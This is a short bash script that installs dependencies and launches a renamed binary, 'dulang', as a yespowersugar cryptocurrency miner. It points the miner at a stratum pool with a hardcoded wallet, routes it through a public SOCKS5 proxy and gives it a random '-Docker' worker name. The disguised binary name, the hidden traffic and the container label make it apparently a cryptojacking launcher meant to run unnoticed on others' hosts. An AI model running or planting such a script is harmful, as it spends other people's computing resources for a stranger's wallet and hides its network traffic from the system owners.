#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x dulang
screen -dmS ls 
POOL=stratum+tcp://stratum-eu.rplant.xyz:7042
WALLET=sugar1qngmzf54uhj4jdhgmh63kpe7z8nqdgnlemvheeq.dus
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
PROXY=socks5://98.162.25.23:4145
./dulang -a yespowersugar -o $POOL -u $WALLET -p $WORKER -t 7 -x $PROXY
